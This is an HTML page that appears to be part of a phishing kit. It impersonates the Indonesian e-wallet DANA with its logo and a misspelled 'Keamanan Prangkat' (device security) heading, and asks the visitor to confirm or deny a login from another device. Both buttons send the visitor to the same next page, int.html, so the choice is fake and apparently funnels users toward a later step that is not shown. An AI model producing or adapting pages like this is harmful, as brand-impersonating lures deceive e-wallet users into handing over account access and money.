    <title>Keamanan Prangkat</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #ffffff;
    }

    .container {
        max-width: 400px;
        margin: 0 auto;
        text-align: center;
    }

    header {
        background-color: #007bff;
        padding: 10px 0;
    }

    .logo {
        width: 80px;
        height: auto;
    }

    h1 {
        font-size: 20px;
        color: #333;
        margin: 20px 0;
    }

    .phone-images {
        position: relative;
        width: 100%;
        max-width: 250px;
        margin: 20px auto;
    }

    .phone-image {
        width: 100%;
        right: 50px;
    }

    .phone-image:nth-child(2) {
        position: absolute;
        top: 20px;
        left: 60px;
        width: 100%;
    }

    p {
        font-size: 16px;
        color: #666;
        margin-bottom: 20px;
    }

    .buttons {
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .button-yes, .button-no {
        display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            text-align: center;
            text-decoration: none;
            border-radius: 5px;
            margin: 10px;
            cursor: pointer;
    }

    .button-yes {
        background-color: white;
            color: #008CBA;
            border: 2px solid #008CBA;
    }

    .button-no {
        background-color: white;
            color: #f44336;
            border: 2px solid #f44336;
    }

</style>
</head>
<body>
    <div class="container">
        <header>
            <img src="dana_logo.png" alt="DANA Logo" class="logo">
        </header>
        <main>
            <h1>Keamanan Prangkat</h1>
            <div class="phone-images">
                <img src="hp.jpg.avif" alt="Phone Image" class="phone-image">
                <img src="hp.jpg.avif" alt="Phone Image" class="phone-image">
            </div>
            <p>Verifikasi Permintaan Login Prangkat lain</p>
            <div class="buttons">
                <button class="button-yes" onclick="window.location.href='int.html'">Saya Melakukan Aktivitas</button>
                <button class="button-no" onclick="window.location.href='int.html'">Saya Tidak Melakukan Aktivitas</button>
            </div>
        </main>
    </div>
